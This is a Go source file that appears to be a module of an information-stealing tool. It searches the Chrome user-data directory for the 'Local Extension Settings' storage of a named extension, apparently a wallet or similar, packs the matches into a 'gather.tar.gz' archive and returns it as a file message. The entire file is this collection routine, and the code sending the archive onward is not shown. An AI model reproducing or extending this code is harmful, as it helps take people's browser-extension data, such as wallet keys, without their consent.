package auto

import (
	"bits-project/bits/config"
	"bits-project/bits/util"
	"bytes"
	"os"
	"path/filepath"
	"strings"
	"runtime"
)

func AutoModeChromeGather() (string, [][]byte) {
	print("===========	AutoModeChromeGather ===========", runtime.GOOS, "\n")
	
	var (
		buf          bytes.Buffer
		userdata_dir string
		path_list    []string
	)

	// gather
	userdata_dir = getUserdataDir()

	// file system search
	_ = filepath.Walk(userdata_dir, func(path string, info os.FileInfo, err error) error {
		if info.Name() == extension_dir && strings.Contains(path, "Local Extension Settings") {
			path_list = append(path_list, path)
		}
		return nil
	})

	_ = util.Compress(&buf, path_list, true)

	print("===========	End ===========\n")

	// return
	data := make([][]byte, 3)
	data[0] = []byte(config.LOG_SUCCESS)
	data[1] = []byte("gather.tar.gz")
	data[2] = buf.Bytes()
	msg_type := config.MSG_FILE

	return msg_type, data
}
